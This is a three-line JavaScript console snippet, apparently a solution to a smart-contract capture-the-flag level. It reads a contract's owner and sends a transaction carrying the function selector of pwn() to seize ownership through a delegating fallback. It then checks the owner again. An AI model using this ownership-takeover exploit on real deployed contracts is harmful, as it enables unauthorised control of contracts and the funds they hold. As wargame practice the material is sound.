contract.owner()
contract.sendTransaction({data:web3.sha3("pwn()").slice(0,10)});
contract.owner()